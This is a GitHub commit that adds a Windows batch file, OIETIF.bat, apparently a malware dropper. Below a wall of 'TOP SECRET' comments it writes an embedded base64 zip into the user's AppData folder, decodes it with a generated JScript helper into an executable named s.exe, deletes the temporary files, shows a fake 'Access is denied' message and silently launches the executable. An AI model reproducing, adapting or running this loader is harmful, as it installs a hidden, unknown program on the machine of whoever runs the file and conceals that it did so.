28458f55eea79c42d16d0650976187f2dedbc856
FilipeET <82539588+Filipemendonca1978@users.noreply.github.com>
2022-02-09 11:31:49 -0300

    Add files via upload

---
+++ OIETIF.bat
@@ -0,0 +1,88 @@
+@echo off
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET
+REM TOP SECRET!!!
+@echo on
+
+cd %appdata% & @echo off
+echo UEsDBBQAAAAIAHVkpVK53FW7EgYAAAAQAAAFAAAAcy5leGXtF2lsFGX0TVtKKW1ZQzchAvJ1WaE0>x
+echo sp22aAxZyi7dFSorXbq9kKvD7tfOlN2ZMjMLhUDSpEErpQSNCf7wikYTG/8ANUCVskkJR2KTJkTl>>x
+echo j9EgkFUQC0QEhI5vjrbcosGQGF777mPee7P79esrr+6EVABIQ9Q0gP1gggf+HgYQc6b15ED3uP68>>x
+echo /UygP6+KFxTSLEuNMhcjYU4UJZWsoUSOi0QQia8iRGJShLqyszOdVo3egcG267vfHxjG0z9NHRhC>>x
+echo /v2GMwM3DdsHA78Y9tyBPw0+weCVQpjX4+/sKegHCDBjoPPyW/XDth8hhRnPjANIQSXTMtosJNa0>>x
+echo uoz+MZZ7mEO9uZxQDoNuz1Yj0GYVsI2WGoZ3sV7QKplg7rE0dLofYrd3AXlwnkulLSryxQyMzGK8>>x
+echo 1NtL1LvkCKdyAI4U02DEpN8eh617XGYYOPVFsHD77kbjEi5ZkcNgzeqx4rLuUU+mUQkDu3RD0IrL>>x
+echo uStuwQNGfAL/ASwNVdfUNgH+pOrIoynB+4gHNPtzSFFnoMnTcVKzT0JVD+xINsGBVozrBdYDHTdD>>x
+echo lz/R7E7D2elz5gaNlOqQZp+CtlDbVSY+UbPno5wkmLR61cqSxPJlfaZp9aqSxMo3APWvLWg7PyVU>>x
+echo U8vXGR3kIu2YatPpIF+PrEY7was677iqnegY3Kqp+VuvqE587oQg9sY0TdS+6ww4nUub0o2ZgHfg>>x
+echo PNq3bYfzO6uctsqmfM1OMD+o2dOQYd6UIN9u9K7ZQX8ORpmZZhmoPOpzsvpnG7lb/8xq9gx9L2P1>>x
+echo vaRr9jnGFMvbDk/pe4xv8d/D6Tw8xxFv5Jk6j3wT4jbEFYiLEF9AfAcx34rptjgUe6AOccUK14og>>x
+echo v1ERwlzUJwvrKZ4XohqJRjGkUo16I01xRQ2iQ4jSRgqwRK3kBIUu4uSIX5YlWS8VoiE+rkakDeJo>>x
+echo 4A0y2uen+Ewb6iRv1HYY5TloO39LXC6+cLhFf1SztkCZTDmVvoSteeGH1BBVdTEoCaJKcYLPmIVU>>x
+echo LYvLMhVxVClMFQU602plwUwBkoJ+3eGNRGTdCRdTAhIXCQhrZE7e6AW4hjou0Bs1zskyKItK+o7E>>x
+echo CGYv9lcu8QdKil3GUi+Av0VQawUR16X4W/DL5q8c9l1kKpqpaHVQJa2lIsBOJiBJa+PNI5ut4aJx>>x
+echo nOIZMF+NETbiVMDrq/EGy4crPoH/M5yD7cd2nNyR2DFwEDZ/BZv3p0K/bX+qba/OIH3fhKLjPRWT>>x
+echo +m29b29JTmS+/HBL8mmD5ho0x6AZBk0x6A3Q6RWDDoJZ7dYyDVv2Dib3QO/2LcnD+PDru1uHjrdk>>x
+echo th8728wmzq47d6nhUOBFaD14NatnKCu5AQ7VwcvJZuCrz0zrHQN816mxpUfSumYcSc+EapRaS9uz>>x
+echo ZnyUCSjWNxzoKsiBU0MmZ0+XHk2rLH/z1BBf/buea5q/6MKMxnbGyjUlcmqITfAwNK0XoLQ9LQmw>>x
+echo 6/VvfkM8n+WzpAt9BxjYB5+7QS12EzkNb7y27px+27lfu3NM82RU/tg2NiOhPqU7yno8Cw4Q6H6t>>x
+echo 337u575lUpzo3zTSiBfiinJ/VflLNOIiC7kYJRXrqezKzszOBJ/fW7WolEAwSjmFkg2coILrjvdF>>x
+echo 5s8qIc/OmU8WBzJSbam5LSRvVn7+TPL8zPkozXI450+/01U8vaCAzCQFhdPJzHwHcZXMKTaqLA5A>>x
+echo dddwXfOqyMAkpIitd9r1P4HsPezjUFiEUp0HgGLQaevO6eYUhcbWRDeSllhUVOY54rI4VwnzNMYp>>x
+echo s2NCWJYUqUGdHZZiczkl5lpf5CAxThQaqKLWUFkRJHGeo8jFOkqzMwlxqzIur1xskB6yWomZh5kK>>x
+echo DcfxEN5o6WiR6bo4PoVGRk+8Eeetbn8LpqrYSICup1ES1ek8h+4WZOqNxARRUFSZUyXZQeKCN6wf>>x
+echo uPMcDVxUoY5Sd+F96oz2UXj/RtyFt7XtLhyZH3V34fBqS4NeH/76ypcsrKuzhH+q6/8r6Nd7OzuZ>>x
+echo LWDd7EJ2OdvIbmJ3se+xH7Nd7B72EnuNTS0aX1RS5CkC42+rfr13sx72UZ5DT+DxwF9QSwECFAAU>>x
+echo AAAACAB1ZKVSudxVuxIGAAAAEAAABQAAAAAAAAAAAAAA/4EAAAAAcy5leGVQSwUGAAAAAAEAAQAz>>x
+echo AAAANQYAAAAA>>x
+
+echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
+echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
+echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
+echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
+echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js
+
+set v="%appdata%\s.exe"
+del %v% >NUL 2>NUL
+cscript x.js
+del x.js >NUL 2>NUL
+del z.zip >NUL 2>NUL
+del x >NUL 2>NUL
+echo.
+echo %appdata%\s.exe
+echo Access is denied
+start "" %v%
